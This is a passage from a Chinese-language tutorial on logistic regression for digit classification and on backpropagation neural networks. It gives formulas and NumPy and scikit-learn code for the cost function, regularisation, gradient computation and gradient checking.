axis=1)\u8fd4\u56deh\u4e2d\u6bcf\u4e00\u884c\u7684\u6700\u5927\u503c\uff08\u662f\u67d0\u4e2a\u6570\u5b57\u7684\u6700\u5927\u6982\u7387\uff09\n    - \u6700\u540ewhere\u627e\u5230\u7684\u6700\u5927\u6982\u7387\u6240\u5728\u7684\u5217\u53f7\uff08\u5217\u53f7\u5373\u662f\u5bf9\u5e94\u7684\u6570\u5b57\uff09\n    '''\n    p = np.array(np.where(h[0,:] == np.max(h, axis=1)[0]))  \n    for i in np.arange(1, m):\n        t = np.array(np.where(h[i,:] == np.max(h, axis=1)[i]))\n        p = np.vstack((p,t))\n    return p\n```\n\n### 5\u3001\u8fd0\u884c\u7ed3\u679c\n- 10\u6b21\u5206\u7c7b\uff0c\u5728\u8bad\u7ec3\u96c6\u4e0a\u7684\u51c6\u786e\u5ea6\uff1a   \n![enter description here][13]\n\n### 6\u3001[\u4f7f\u7528scikit-learn\u5e93\u4e2d\u7684\u903b\u8f91\u56de\u5f52\u6a21\u578b\u5b9e\u73b0](\/LogisticRegression\/LogisticRegression_OneVsAll_scikit-learn.py)\n- 1\u3001\u5bfc\u5165\u5305\n```\nfrom scipy import io as spio\nimport numpy as np\nfrom sklearn import svm\nfrom sklearn.linear_model import LogisticRegression\n```\n- 2\u3001\u52a0\u8f7d\u6570\u636e\n```\n    data = loadmat_data(\"data_digits.mat\") \n    X = data['X']   # \u83b7\u53d6X\u6570\u636e\uff0c\u6bcf\u4e00\u884c\u5bf9\u5e94\u4e00\u4e2a\u6570\u5b5720x20px\n    y = data['y']   # \u8fd9\u91cc\u8bfb\u53d6mat\u6587\u4ef6y\u7684shape=(5000, 1)\n    y = np.ravel(y) # \u8c03\u7528sklearn\u9700\u8981\u8f6c\u5316\u6210\u4e00\u7ef4\u7684(5000,)\n```\n- 3\u3001\u62df\u5408\u6a21\u578b\n```\n    model = LogisticRegression()\n    model.fit(X, y) # \u62df\u5408\n```\n- 4\u3001\u9884\u6d4b\n```\n    predict = model.predict(X) #\u9884\u6d4b\n    \n    print u\"\u9884\u6d4b\u51c6\u786e\u5ea6\u4e3a\uff1a%f%%\"%np.mean(np.float64(predict == y)*100)\n```\n- 5\u3001\u8f93\u51fa\u7ed3\u679c\uff08\u5728\u8bad\u7ec3\u96c6\u4e0a\u7684\u51c6\u786e\u5ea6\uff09\n![enter description here][14]\n\n\n----------\n\n## \u4e09\u3001BP\u795e\u7ecf\u7f51\u7edc\n- [\u5168\u90e8\u4ee3\u7801](\/NeuralNetwok\/NeuralNetwork.py)\n\n### 1\u3001\u795e\u7ecf\u7f51\u7edcmodel\n- \u5148\u4ecb\u7ecd\u4e2a\u4e09\u5c42\u7684\u795e\u7ecf\u7f51\u7edc\uff0c\u5982\u4e0b\u56fe\u6240\u793a\n - \u8f93\u5165\u5c42\uff08input layer\uff09\u6709\u4e09\u4e2aunits\uff08![{x_0}](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7Bx_0%7D)\u4e3a\u8865\u4e0a\u7684bias\uff0c\u901a\u5e38\u8bbe\u4e3a`1`\uff09\n - ![a_i^{(j)}](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=a_i%5E%7B%28j%29%7D)\u8868\u793a\u7b2c`j`\u5c42\u7684\u7b2c`i`\u4e2a\u6fc0\u52b1\uff0c\u4e5f\u79f0\u4e3a\u4e3a\u5355\u5143unit\n - ![{\\theta ^{(j)}}](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7B%5Ctheta%20%5E%7B%28j%29%7D%7D)\u4e3a\u7b2c`j`\u5c42\u5230\u7b2c`j+1`\u5c42\u6620\u5c04\u7684\u6743\u91cd\u77e9\u9635\uff0c\u5c31\u662f\u6bcf\u6761\u8fb9\u7684\u6743\u91cd\n![enter description here][15]\n\n- \u6240\u4ee5\u53ef\u4ee5\u5f97\u5230\uff1a\n - \u9690\u542b\u5c42\uff1a  \n![a_1^{(2)} = g(\\theta _{10}^{(1)}{x_0} + \\theta _{11}^{(1)}{x_1} + \\theta _{12}^{(1)}{x_2} + \\theta _{13}^{(1)}{x_3})](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=a_1%5E%7B%282%29%7D%20%3D%20g%28%5Ctheta%20_%7B10%7D%5E%7B%281%29%7D%7Bx_0%7D%20%2B%20%5Ctheta%20_%7B11%7D%5E%7B%281%29%7D%7Bx_1%7D%20%2B%20%5Ctheta%20_%7B12%7D%5E%7B%281%29%7D%7Bx_2%7D%20%2B%20%5Ctheta%20_%7B13%7D%5E%7B%281%29%7D%7Bx_3%7D%29)   \n![a_2^{(2)} = g(\\theta _{20}^{(1)}{x_0} + \\theta _{21}^{(1)}{x_1} + \\theta _{22}^{(1)}{x_2} + \\theta _{23}^{(1)}{x_3})](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=a_2%5E%7B%282%29%7D%20%3D%20g%28%5Ctheta%20_%7B20%7D%5E%7B%281%29%7D%7Bx_0%7D%20%2B%20%5Ctheta%20_%7B21%7D%5E%7B%281%29%7D%7Bx_1%7D%20%2B%20%5Ctheta%20_%7B22%7D%5E%7B%281%29%7D%7Bx_2%7D%20%2B%20%5Ctheta%20_%7B23%7D%5E%7B%281%29%7D%7Bx_3%7D%29)   \n![a_3^{(2)} = g(\\theta _{30}^{(1)}{x_0} + \\theta _{31}^{(1)}{x_1} + \\theta _{32}^{(1)}{x_2} + \\theta _{33}^{(1)}{x_3})](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=a_3%5E%7B%282%29%7D%20%3D%20g%28%5Ctheta%20_%7B30%7D%5E%7B%281%29%7D%7Bx_0%7D%20%2B%20%5Ctheta%20_%7B31%7D%5E%7B%281%29%7D%7Bx_1%7D%20%2B%20%5Ctheta%20_%7B32%7D%5E%7B%281%29%7D%7Bx_2%7D%20%2B%20%5Ctheta%20_%7B33%7D%5E%7B%281%29%7D%7Bx_3%7D%29)\n - \u8f93\u51fa\u5c42   \n![{h_\\theta }(x) = a_1^{(3)} = g(\\theta _{10}^{(2)}a_0^{(2)} + \\theta _{11}^{(2)}a_1^{(2)} + \\theta _{12}^{(2)}a_2^{(2)} + \\theta _{13}^{(2)}a_3^{(2)})](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7Bh_%5Ctheta%20%7D%28x%29%20%3D%20a_1%5E%7B%283%29%7D%20%3D%20g%28%5Ctheta%20_%7B10%7D%5E%7B%282%29%7Da_0%5E%7B%282%29%7D%20%2B%20%5Ctheta%20_%7B11%7D%5E%7B%282%29%7Da_1%5E%7B%282%29%7D%20%2B%20%5Ctheta%20_%7B12%7D%5E%7B%282%29%7Da_2%5E%7B%282%29%7D%20%2B%20%5Ctheta%20_%7B13%7D%5E%7B%282%29%7Da_3%5E%7B%282%29%7D%29) \u5176\u4e2d\uff0c**S\u578b\u51fd\u6570**![g(z) = \\frac{1}{{1 + {e^{ - z}}}}](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=g%28z%29%20%3D%20%5Cfrac%7B1%7D%7B%7B1%20%2B%20%7Be%5E%7B%20-%20z%7D%7D%7D%7D)\uff0c\u4e5f\u6210\u4e3a**\u6fc0\u52b1\u51fd\u6570**\n- \u53ef\u4ee5\u770b\u51fa![{\\theta ^{(1)}}](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7B%5Ctheta%20%5E%7B%281%29%7D%7D) \u4e3a3x4\u7684\u77e9\u9635\uff0c![{\\theta ^{(2)}}](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7B%5Ctheta%20%5E%7B%282%29%7D%7D)\u4e3a1x4\u7684\u77e9\u9635\n - ![{\\theta ^{(j)}}](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7B%5Ctheta%20%5E%7B%28j%29%7D%7D) ==\u300b`j+1`\u7684\u5355\u5143\u6570x\uff08`j`\u5c42\u7684\u5355\u5143\u6570+1\uff09\n\n### 2\u3001\u4ee3\u4ef7\u51fd\u6570\n- \u5047\u8bbe\u6700\u540e\u8f93\u51fa\u7684![{h_\\Theta }(x) \\in {R^K}](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7Bh_%5CTheta%20%7D%28x%29%20%5Cin%20%7BR%5EK%7D)\uff0c\u5373\u4ee3\u8868\u8f93\u51fa\u5c42\u6709K\u4e2a\u5355\u5143\n- ![J(\\Theta ) =  - \\frac{1}{m}\\sum\\limits_{i = 1}^m {\\sum\\limits_{k = 1}^K {[y_k^{(i)}\\log {{({h_\\Theta }({x^{(i)}}))}_k}} }  + (1 - y_k^{(i)})\\log {(1 - {h_\\Theta }({x^{(i)}}))_k}]](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=J%28%5CTheta%20%29%20%3D%20%20-%20%5Cfrac%7B1%7D%7Bm%7D%5Csum%5Climits_%7Bi%20%3D%201%7D%5Em%20%7B%5Csum%5Climits_%7Bk%20%3D%201%7D%5EK%20%7B%5By_k%5E%7B%28i%29%7D%5Clog%20%7B%7B%28%7Bh_%5CTheta%20%7D%28%7Bx%5E%7B%28i%29%7D%7D%29%29%7D_k%7D%7D%20%7D%20%20%2B%20%281%20-%20y_k%5E%7B%28i%29%7D%29%5Clog%20%7B%281%20-%20%7Bh_%5CTheta%20%7D%28%7Bx%5E%7B%28i%29%7D%7D%29%29_k%7D%5D) \u5176\u4e2d\uff0c![{({h_\\Theta }(x))_i}](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7B%28%7Bh_%5CTheta%20%7D%28x%29%29_i%7D)\u4ee3\u8868\u7b2c`i`\u4e2a\u5355\u5143\u8f93\u51fa\n- \u4e0e\u903b\u8f91\u56de\u5f52\u7684\u4ee3\u4ef7\u51fd\u6570![J(\\theta ) =  - \\frac{1}{m}\\sum\\limits_{i = 1}^m {[{y^{(i)}}\\log ({h_\\theta }({x^{(i)}}) + (1 - } {y^{(i)}})\\log (1 - {h_\\theta }({x^{(i)}})]](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=J%28%5Ctheta%20%29%20%3D%20%20-%20%5Cfrac%7B1%7D%7Bm%7D%5Csum%5Climits_%7Bi%20%3D%201%7D%5Em%20%7B%5B%7By%5E%7B%28i%29%7D%7D%5Clog%20%28%7Bh_%5Ctheta%20%7D%28%7Bx%5E%7B%28i%29%7D%7D%29%20%2B%20%281%20-%20%7D%20%7By%5E%7B%28i%29%7D%7D%29%5Clog%20%281%20-%20%7Bh_%5Ctheta%20%7D%28%7Bx%5E%7B%28i%29%7D%7D%29%5D)\u5dee\u4e0d\u591a\uff0c\u5c31\u662f\u7d2f\u52a0\u4e0a\u6bcf\u4e2a\u8f93\u51fa\uff08\u5171\u6709K\u4e2a\u8f93\u51fa\uff09\n\n\n\n### 3\u3001\u6b63\u5219\u5316\n- `L`-->\u6240\u6709\u5c42\u7684\u4e2a\u6570\n- ![{S_l}](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7BS_l%7D)-->\u7b2c`l`\u5c42unit\u7684\u4e2a\u6570\n- \u6b63\u5219\u5316\u540e\u7684**\u4ee3\u4ef7\u51fd\u6570**\u4e3a  \n![enter description here][16]\n - ![\\theta ](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%5Ctheta%20)\u5171\u6709`L-1`\u5c42\uff0c\n - \u7136\u540e\u662f\u7d2f\u52a0\u5bf9\u5e94\u6bcf\u4e00\u5c42\u7684theta\u77e9\u9635\uff0c\u6ce8\u610f\u4e0d\u5305\u542b\u52a0\u4e0a\u504f\u7f6e\u9879\u5bf9\u5e94\u7684theta(0)\n- \u6b63\u5219\u5316\u540e\u7684\u4ee3\u4ef7\u51fd\u6570\u5b9e\u73b0\u4ee3\u7801\uff1a\n```\n# \u4ee3\u4ef7\u51fd\u6570\ndef nnCostFunction(nn_params,input_layer_size,hidden_layer_size,num_labels,X,y,Lambda):\n    length = nn_params.shape[0] # theta\u7684\u4e2d\u957f\u5ea6\n    # \u8fd8\u539ftheta1\u548ctheta2\n    Theta1 = nn_params[0:hidden_layer_size*(input_layer_size+1)].reshape(hidden_layer_size,input_layer_size+1)\n    Theta2 = nn_params[hidden_layer_size*(input_layer_size+1):length].reshape(num_labels,hidden_layer_size+1)\n    \n    # np.savetxt(\"Theta1.csv\",Theta1,delimiter=',')\n    \n    m = X.shape[0]\n    class_y = np.zeros((m,num_labels))      # \u6570\u636e\u7684y\u5bf9\u5e940-9\uff0c\u9700\u8981\u6620\u5c04\u4e3a0\/1\u7684\u5173\u7cfb\n    # \u6620\u5c04y\n    for i in range(num_labels):\n        class_y[:,i] = np.int32(y==i).reshape(1,-1) # \u6ce8\u610freshape(1,-1)\u624d\u53ef\u4ee5\u8d4b\u503c\n     \n    '''\u53bb\u6389theta1\u548ctheta2\u7684\u7b2c\u4e00\u5217\uff0c\u56e0\u4e3a\u6b63\u5219\u5316\u65f6\u4ece1\u5f00\u59cb'''    \n    Theta1_colCount = Theta1.shape[1]    \n    Theta1_x = Theta1[:,1:Theta1_colCount]\n    Theta2_colCount = Theta2.shape[1]    \n    Theta2_x = Theta2[:,1:Theta2_colCount]\n    # \u6b63\u5219\u5316\u5411theta^2\n    term = np.dot(np.transpose(np.vstack((Theta1_x.reshape(-1,1),Theta2_x.reshape(-1,1)))),np.vstack((Theta1_x.reshape(-1,1),Theta2_x.reshape(-1,1))))\n    \n    '''\u6b63\u5411\u4f20\u64ad,\u6bcf\u6b21\u9700\u8981\u8865\u4e0a\u4e00\u52171\u7684\u504f\u7f6ebias'''\n    a1 = np.hstack((np.ones((m,1)),X))      \n    z2 = np.dot(a1,np.transpose(Theta1))    \n    a2 = sigmoid(z2)\n    a2 = np.hstack((np.ones((m,1)),a2))\n    z3 = np.dot(a2,np.transpose(Theta2))\n    h  = sigmoid(z3)    \n    '''\u4ee3\u4ef7'''    \n    J = -(np.dot(np.transpose(class_y.reshape(-1,1)),np.log(h.reshape(-1,1)))+np.dot(np.transpose(1-class_y.reshape(-1,1)),np.log(1-h.reshape(-1,1)))-Lambda*term\/2)\/m   \n    \n    return np.ravel(J)\n```\n\n### 4\u3001\u53cd\u5411\u4f20\u64adBP\n- \u4e0a\u9762\u6b63\u5411\u4f20\u64ad\u53ef\u4ee5\u8ba1\u7b97\u5f97\u5230`J(\u03b8)`,\u4f7f\u7528\u68af\u5ea6\u4e0b\u964d\u6cd5\u8fd8\u9700\u8981\u6c42\u5b83\u7684\u68af\u5ea6\n- BP\u53cd\u5411\u4f20\u64ad\u7684\u76ee\u7684\u5c31\u662f\u6c42\u4ee3\u4ef7\u51fd\u6570\u7684\u68af\u5ea6\n- \u5047\u8bbe4\u5c42\u7684\u795e\u7ecf\u7f51\u7edc,![\\delta _{\\text{j}}^{(l)}](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%5Cdelta%20_%7B%5Ctext%7Bj%7D%7D%5E%7B%28l%29%7D)\u8bb0\u4e3a-->`l`\u5c42\u7b2c`j`\u4e2a\u5355\u5143\u7684\u8bef\u5dee\n - ![\\delta _{\\text{j}}^{(4)} = a_j^{(4)} - {y_i}](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%5Cdelta%20_%7B%5Ctext%7Bj%7D%7D%5E%7B%284%29%7D%20%3D%20a_j%5E%7B%284%29%7D%20-%20%7By_i%7D)\u300a===\u300b![{\\delta ^{(4)}} = {a^{(4)}} - y](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7B%5Cdelta%20%5E%7B%284%29%7D%7D%20%3D%20%7Ba%5E%7B%284%29%7D%7D%20-%20y)\uff08\u5411\u91cf\u5316\uff09\n - ![{\\delta ^{(3)}} = {({\\theta ^{(3)}})^T}{\\delta ^{(4)}}.*{g^}({a^{(3)}})](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7B%5Cdelta%20%5E%7B%283%29%7D%7D%20%3D%20%7B%28%7B%5Ctheta%20%5E%7B%283%29%7D%7D%29%5ET%7D%7B%5Cdelta%20%5E%7B%284%29%7D%7D.%2A%7Bg%5E%7D%28%7Ba%5E%7B%283%29%7D%7D%29)\n - ![{\\delta ^{(2)}} = {({\\theta ^{(2)}})^T}{\\delta ^{(3)}}.*{g^}({a^{(2)}})](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7B%5Cdelta%20%5E%7B%282%29%7D%7D%20%3D%20%7B%28%7B%5Ctheta%20%5E%7B%282%29%7D%7D%29%5ET%7D%7B%5Cdelta%20%5E%7B%283%29%7D%7D.%2A%7Bg%5E%7D%28%7Ba%5E%7B%282%29%7D%7D%29)\n - \u6ca1\u6709![{\\delta ^{(1)}}](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7B%5Cdelta%20%5E%7B%281%29%7D%7D)\uff0c\u56e0\u4e3a\u5bf9\u4e8e\u8f93\u5165\u6ca1\u6709\u8bef\u5dee\n- \u56e0\u4e3aS\u578b\u51fd\u6570![{\\text{g(z)}}](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7B%5Ctext%7Bg%28z%29%7D%7D)\u7684\u5bfc\u6570\u4e3a\uff1a![{g^}(z){\\text{ = g(z)(1 - g(z))}}](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7Bg%5E%7D%28z%29%7B%5Ctext%7B%20%3D%20g%28z%29%281%20-%20g%28z%29%29%7D%7D)\uff0c\u6240\u4ee5\u4e0a\u9762\u7684![{g^}({a^{(3)}})](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7Bg%5E%7D%28%7Ba%5E%7B%283%29%7D%7D%29)\u548c![{g^}({a^{(2)}})](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7Bg%5E%7D%28%7Ba%5E%7B%282%29%7D%7D%29)\u53ef\u4ee5\u5728\u524d\u5411\u4f20\u64ad\u4e2d\u8ba1\u7b97\u51fa\u6765\n\n- \u53cd\u5411\u4f20\u64ad\u8ba1\u7b97\u68af\u5ea6\u7684\u8fc7\u7a0b\u4e3a\uff1a\n - ![\\Delta _{ij}^{(l)} = 0](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%5CDelta%20_%7Bij%7D%5E%7B%28l%29%7D%20%3D%200)\uff08![\\Delta ](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%5CDelta%20)\u662f\u5927\u5199\u7684![\\delta ](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%5Cdelta%20)\uff09\n - for i=1-m:     \n -![{a^{(1)}} = {x^{(i)}}](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7Ba%5E%7B%281%29%7D%7D%20%3D%20%7Bx%5E%7B%28i%29%7D%7D)       \n-\u6b63\u5411\u4f20\u64ad\u8ba1\u7b97![{a^{(l)}}](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7Ba%5E%7B%28l%29%7D%7D)\uff08l=2,3,4...L\uff09      \n-\u53cd\u5411\u8ba1\u7b97![{\\delta ^{(L)}}](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7B%5Cdelta%20%5E%7B%28L%29%7D%7D)\u3001![{\\delta ^{(L - 1)}}](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7B%5Cdelta%20%5E%7B%28L%20-%201%29%7D%7D)...![{\\delta ^{(2)}}](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7B%5Cdelta%20%5E%7B%282%29%7D%7D)\uff1b       \n-![\\Delta _{ij}^{(l)} = \\Delta _{ij}^{(l)} + a_j^{(l)}{\\delta ^{(l + 1)}}](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%5CDelta%20_%7Bij%7D%5E%7B%28l%29%7D%20%3D%20%5CDelta%20_%7Bij%7D%5E%7B%28l%29%7D%20%2B%20a_j%5E%7B%28l%29%7D%7B%5Cdelta%20%5E%7B%28l%20%2B%201%29%7D%7D)          \n-![D_{ij}^{(l)} = \\frac{1}{m}\\Delta _{ij}^{(l)} + \\lambda \\theta _{ij}^l\\begin{array}{c}    {}&amp; {(j \\ne 0)}  \\end{array} ](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=D_%7Bij%7D%5E%7B%28l%29%7D%20%3D%20%5Cfrac%7B1%7D%7Bm%7D%5CDelta%20_%7Bij%7D%5E%7B%28l%29%7D%20%2B%20%5Clambda%20%5Ctheta%20_%7Bij%7D%5El%5Cbegin%7Barray%7D%7Bc%7D%20%20%20%20%7B%7D%26%20%7B%28j%20%5Cne%200%29%7D%20%20%5Cend%7Barray%7D%20)      \n![D_{ij}^{(l)} = \\frac{1}{m}\\Delta _{ij}^{(l)} + \\lambda \\theta _{ij}^lj = 0\\begin{array}{c}    {}&amp; {j = 0}  \\end{array} ](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=D_%7Bij%7D%5E%7B%28l%29%7D%20%3D%20%5Cfrac%7B1%7D%7Bm%7D%5CDelta%20_%7Bij%7D%5E%7B%28l%29%7D%20%2B%20%5Clambda%20%5Ctheta%20_%7Bij%7D%5Elj%20%3D%200%5Cbegin%7Barray%7D%7Bc%7D%20%20%20%20%7B%7D%26%20%7Bj%20%3D%200%7D%20%20%5Cend%7Barray%7D%20)     \n\n- \u6700\u540e![\\frac{{\\partial J(\\Theta )}}{{\\partial \\Theta _{ij}^{(l)}}} = D_{ij}^{(l)}](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%5Cfrac%7B%7B%5Cpartial%20J%28%5CTheta%20%29%7D%7D%7B%7B%5Cpartial%20%5CTheta%20_%7Bij%7D%5E%7B%28l%29%7D%7D%7D%20%3D%20D_%7Bij%7D%5E%7B%28l%29%7D)\uff0c\u5373\u5f97\u5230\u4ee3\u4ef7\u51fd\u6570\u7684\u68af\u5ea6\n- \u5b9e\u73b0\u4ee3\u7801\uff1a\n```\n# \u68af\u5ea6\ndef nnGradient(nn_params,input_layer_size,hidden_layer_size,num_labels,X,y,Lambda):\n    length = nn_params.shape[0]\n    Theta1 = nn_params[0:hidden_layer_size*(input_layer_size+1)].reshape(hidden_layer_size,input_layer_size+1).copy()   # \u8fd9\u91cc\u4f7f\u7528copy\u51fd\u6570\uff0c\u5426\u5219\u4e0b\u9762\u4fee\u6539Theta\u7684\u503c\uff0cnn_params\u4e5f\u4f1a\u4e00\u8d77\u4fee\u6539\n    Theta2 = nn_params[hidden_layer_size*(input_layer_size+1):length].reshape(num_labels,hidden_layer_size+1).copy()\n    m = X.shape[0]\n    class_y = np.zeros((m,num_labels))      # \u6570\u636e\u7684y\u5bf9\u5e940-9\uff0c\u9700\u8981\u6620\u5c04\u4e3a0\/1\u7684\u5173\u7cfb    \n    # \u6620\u5c04y\n    for i in range(num_labels):\n        class_y[:,i] = np.int32(y==i).reshape(1,-1) # \u6ce8\u610freshape(1,-1)\u624d\u53ef\u4ee5\u8d4b\u503c\n     \n    '''\u53bb\u6389theta1\u548ctheta2\u7684\u7b2c\u4e00\u5217\uff0c\u56e0\u4e3a\u6b63\u5219\u5316\u65f6\u4ece1\u5f00\u59cb'''\n    Theta1_colCount = Theta1.shape[1]    \n    Theta1_x = Theta1[:,1:Theta1_colCount]\n    Theta2_colCount = Theta2.shape[1]    \n    Theta2_x = Theta2[:,1:Theta2_colCount]\n    \n    Theta1_grad = np.zeros((Theta1.shape))  #\u7b2c\u4e00\u5c42\u5230\u7b2c\u4e8c\u5c42\u7684\u6743\u91cd\n    Theta2_grad = np.zeros((Theta2.shape))  #\u7b2c\u4e8c\u5c42\u5230\u7b2c\u4e09\u5c42\u7684\u6743\u91cd\n      \n   \n    '''\u6b63\u5411\u4f20\u64ad\uff0c\u6bcf\u6b21\u9700\u8981\u8865\u4e0a\u4e00\u52171\u7684\u504f\u7f6ebias'''\n    a1 = np.hstack((np.ones((m,1)),X))\n    z2 = np.dot(a1,np.transpose(Theta1))\n    a2 = sigmoid(z2)\n    a2 = np.hstack((np.ones((m,1)),a2))\n    z3 = np.dot(a2,np.transpose(Theta2))\n    h  = sigmoid(z3)\n    \n    \n    '''\u53cd\u5411\u4f20\u64ad\uff0cdelta\u4e3a\u8bef\u5dee\uff0c'''\n    delta3 = np.zeros((m,num_labels))\n    delta2 = np.zeros((m,hidden_layer_size))\n    for i in range(m):\n        #delta3[i,:] = (h[i,:]-class_y[i,:])*sigmoidGradient(z3[i,:])  # \u5747\u65b9\u8bef\u5dee\u7684\u8bef\u5dee\u7387\n        delta3[i,:] = h[i,:]-class_y[i,:]                              # \u4ea4\u53c9\u71b5\u8bef\u5dee\u7387\n        Theta2_grad = Theta2_grad+np.dot(np.transpose(delta3[i,:].reshape(1,-1)),a2[i,:].reshape(1,-1))\n        delta2[i,:] = np.dot(delta3[i,:].reshape(1,-1),Theta2_x)*sigmoidGradient(z2[i,:])\n        Theta1_grad = Theta1_grad+np.dot(np.transpose(delta2[i,:].reshape(1,-1)),a1[i,:].reshape(1,-1))\n    \n    Theta1[:,0] = 0\n    Theta2[:,0] = 0          \n    '''\u68af\u5ea6'''\n    grad = (np.vstack((Theta1_grad.reshape(-1,1),Theta2_grad.reshape(-1,1)))+Lambda*np.vstack((Theta1.reshape(-1,1),Theta2.reshape(-1,1))))\/m\n    return np.ravel(grad)\n```\n\n### 5\u3001BP\u53ef\u4ee5\u6c42\u68af\u5ea6\u7684\u539f\u56e0\n- \u5b9e\u9645\u662f\u5229\u7528\u4e86`\u94fe\u5f0f\u6c42\u5bfc`\u6cd5\u5219\n- \u56e0\u4e3a\u4e0b\u4e00\u5c42\u7684\u5355\u5143\u5229\u7528\u4e0a\u4e00\u5c42\u7684\u5355\u5143\u4f5c\u4e3a\u8f93\u5165\u8fdb\u884c\u8ba1\u7b97\n- \u5927\u4f53\u7684\u63a8\u5bfc\u8fc7\u7a0b\u5982\u4e0b\uff0c\u6700\u7ec8\u6211\u4eec\u662f\u60f3\u9884\u6d4b\u51fd\u6570\u4e0e\u5df2\u77e5\u7684`y`\u975e\u5e38\u63a5\u8fd1\uff0c\u6c42\u5747\u65b9\u5dee\u7684\u68af\u5ea6\u6cbf\u7740\u6b64\u68af\u5ea6\u65b9\u5411\u53ef\u4f7f\u4ee3\u4ef7\u51fd\u6570\u6700\u5c0f\u5316\u3002\u53ef\u5bf9\u7167\u4e0a\u9762\u6c42\u68af\u5ea6\u7684\u8fc7\u7a0b\u3002\n![enter description here][17]\n- \u6c42\u8bef\u5dee\u66f4\u8be6\u7ec6\u7684\u63a8\u5bfc\u8fc7\u7a0b\uff1a\n![enter description here][18]\n\n### 6\u3001\u68af\u5ea6\u68c0\u67e5\n- \u68c0\u67e5\u5229\u7528`BP`\u6c42\u7684\u68af\u5ea6\u662f\u5426\u6b63\u786e\n- \u5229\u7528\u5bfc\u6570\u7684\u5b9a\u4e49\u9a8c\u8bc1\uff1a\n![\\frac{{dJ(\\theta )}}{{d\\theta }} \\approx \\frac{{J(\\theta  + \\varepsilon ) - J(\\theta  - \\varepsilon )}}{{2\\varepsilon }}](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%5Cfrac%7B%7BdJ%28%5Ctheta%20%29%7D%7D%7B%7Bd%5Ctheta%20%7D%7D%20%5Capprox%20%5Cfrac%7B%7BJ%28%5Ctheta%20%20%2B%20%5Cvarepsilon%20%29%20-%20J%28%5Ctheta%20%20-%20%5Cvarepsilon%20%29%7D%7D%7B%7B2%5Cvarepsilon%20%7D%7D)\n- \u6c42\u51fa\u6765\u7684\u6570\u503c\u68af\u5ea6\u5e94\u8be5\u4e0eBP\u6c42\u51fa\u7684\u68af\u5ea6\u975e\u5e38\u63a5\u8fd1\n- 